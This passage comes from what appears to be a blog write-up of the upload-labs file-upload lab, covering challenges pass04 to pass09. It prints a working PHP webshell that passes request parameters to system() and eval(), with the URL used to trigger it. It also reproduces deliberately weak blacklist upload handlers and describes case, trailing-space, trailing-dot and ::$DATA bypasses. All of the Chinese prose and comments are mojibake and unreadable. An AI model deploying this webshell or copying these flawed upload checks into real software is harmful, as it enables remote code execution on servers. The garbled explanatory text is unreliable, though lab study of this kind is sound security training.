<code>xxx</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">system(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">phpinfo(); </span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®<code>http://ip:port/upload/xxx?c=pwd</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130150821889.png" alt="image-20201130150821889"></p><h2 id="pass05"><a href="#pass05" class="headerlink" title="pass05"></a>pass05</h2><h3 id="æºä»£ç -4"><a href="#æºä»£ç -4" class="headerlink" title="æºä»£ç "></a>æºä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·æ˜¯é»‘åå•ï¼Œä½†æ˜¯è¿™æ¬¡åŠ ä¸Šäº†<code>.htaccess</code>ï¼Œæœ¬æƒ³é€šè¿‡<code>.user.ini</code>ç»•è¿‡ï¼Œä½†æ˜¯è€ƒè™‘åˆ°<code>./upload</code>ç›®å½•ä¸‹æ²¡æœ‰phpæ–‡ä»¶ï¼Œå°±ç®—ä¸Šä¼ äº†ä¹Ÿæ— ä»è§¦å‘ã€‚</p><p>å¯¹æ¯”å’Œä¸Šé¢çš„ä»£ç ï¼Œä¸åªæ˜¯è¿‡æ»¤äº†<code>.htaccess</code>ï¼Œè€Œä¸”æ²¡æœ‰è½¬æ¢æˆå°å†™</p><p><code>diff</code> å‘½ä»¤å¯ä»¥æŸ¥çœ‹ä¸¤è€…çš„åŒºåˆ«</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130151535702.png" alt="image-20201130151535702"></p><h3 id="ç»•è¿‡-4"><a href="#ç»•è¿‡-4" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>ç»•è¿‡çš„æ–¹æ³•å°±å¾ˆç®€å•äº†â€”â€”å¤§å°å†™ç»•è¿‡</p><p>ä½†æ˜¯è¿™ç§æ–¹æ³•åªåœ¨windowsä¸‹æœ‰æ•ˆï¼Œç”±äºæˆ‘çš„ç¯å¢ƒæ˜¯Linuxï¼Œæ‰€ä»¥æ— æ³•è§¦å‘è¿™ä¸ªã€‚</p><p><strong><font color='red'>è¿™äº”é“é¢˜å¤§å¤šæ˜¯åˆ©ç”¨äº†windowsç³»ç»Ÿçš„ç‰¹æ€§ï¼Œç”±äºæˆ‘ä½¿ç”¨çš„ç¯å¢ƒæ˜¯Linuxï¼Œæ— æ³•äº§ç”Ÿå®é™…çš„æ•ˆæœï¼Œä¹Ÿå°±æ²¡æœ‰æ•ˆæœå›¾</font></strong></p><p>æŒ–ä¸ªå‘ï¼Œä»¥åç”¨è™šæ‹Ÿæœºé…ä¸ªwindowså¤ç°ä¸€ä¸‹</p><h2 id="pass06"><a href="#pass06" class="headerlink" title="pass06"></a>pass06</h2><h3 id="æºä»£ç -5"><a href="#æºä»£ç -5" class="headerlink" title="æºä»£ç "></a>æºä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç›¸æ¯”äº<code>pass04</code>ï¼Œå°‘äº†ä¸€ä¸ª<code>trim</code>è¯­å¥</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130152326897.png" alt="image-20201130152326897"></p><p><code>trim</code>çš„ä½œç”¨æ˜¯å»æ‰é¦–ä½çš„ç©ºæ ¼</p><p>æ‰€ä»¥è¿™é‡Œçš„è§£æ³•å°±æ˜¯åœ¨æ–‡ä»¶åæœ«å°¾åŠ å…¥ä¸€ä¸ªç©ºæ ¼å³å¯</p><h3 id="ç»•è¿‡-5"><a href="#ç»•è¿‡-5" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>ç”±äºè¿™ä¹Ÿæ˜¯windowsç³»ç»Ÿçš„ç‰¹æ€§ï¼Œæ‰€ä»¥æˆ‘æ— æ³•å¤ç°åœºæ™¯ã€‚</p><h2 id="pass07"><a href="#pass07" class="headerlink" title="pass07"></a>pass07</h2><h3 id="æºä»£ç -6"><a href="#æºä»£ç -6" class="headerlink" title="æºä»£ç "></a>æºä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å·®åˆ«å°±æ˜¯è¿™æ¬¡æ²¡æœ‰å»æ‰æœ«å°¾çš„**<code>.</code>**</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130152607599.png" alt="image-20201130152607599"></p><p>æ‰€ä»¥å¯¼è‡´å¯ä»¥ä½¿ç”¨<code>7.php.</code>ç»•è¿‡</p><blockquote><p>  Windowsä¼šè‡ªåŠ¨å»æ‰åç¼€åä¸­æœ€åçš„ .</p></blockquote><h3 id="ç»•è¿‡-6"><a href="#ç»•è¿‡-6" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>windows ã€‚ã€‚ã€‚ã€‚ã€‚ emmmmm ã€‚ã€‚ã€‚ã€‚ ä½ æ‡‚çš„</p><h2 id="pass08"><a href="#pass08" class="headerlink" title="pass08"></a>pass08</h2><h3 id="æºä»£ç -7"><a href="#æºä»£ç -7" class="headerlink" title="æºä»£ç "></a>æºä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¼ºå°‘çš„æ˜¯ å»æ‰å­—ç¬¦ä¸² <strong><code>::$DATA</code></strong></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201130153110084.png" alt="image-20201130153110084"></p><blockquote><p>  phpåœ¨windowçš„æ—¶å€™å¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒâ€::$DATAâ€ä¹‹å‰çš„æ–‡ä»¶å</p></blockquote><h3 id="ç»•è¿‡-7"><a href="#ç»•è¿‡-7" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>Windowsã€‚ã€‚ã€‚</p><h2 id="pass09"><a href="#pass09" class="headerlink" title="pass09"></a>pass09</h2><h3 id="æºä»£ç -8"><a href="#æºä»£ç -8" class="headerlink" title="æºä»£ç "></a>æºä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 